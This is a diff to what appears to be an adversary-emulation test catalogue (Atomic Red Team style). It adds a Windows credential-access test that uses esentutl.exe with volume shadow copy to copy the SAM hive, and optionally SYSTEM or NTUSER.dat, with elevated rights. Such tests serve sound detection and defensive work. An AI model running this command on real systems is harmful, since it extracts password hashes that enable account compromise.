@@ -19349,6 +19349,33 @@ credential-access:
 '
         name: command_prompt
         elevation_required: true
+    - name: esentutl.exe SAM copy
+      auto_generated_guid: a90c2f4d-6726-444e-99d2-a00cd7c20480
+      description: |
+        Copy the SAM hive using the esentutl.exe utility
+        This can also be used to copy other files and hives like SYSTEM, NTUSER.dat etc.
+      supported_platforms:
+      - windows
+      input_arguments:
+        file_path:
+          description: Path to the file to copy
+          type: Path
+          default: "%SystemRoot%/system32/config/SAM"
+        file_name:
+          description: Name of the copied file
+          type: String
+          default: SAM
+        copy_dest:
+          description: Destination of the copied file
+          type: String
+          default: "%windir%"
+      executor:
+        command: 'del #{copy_dest}\#{file_name} & esentutl.exe /y /vss #{file_path}
+          /d #{copy_dest}/#{file_name}
+
+'
+        name: command_prompt
+        elevation_required: true
   T1555.002:
     technique:
       external_references:
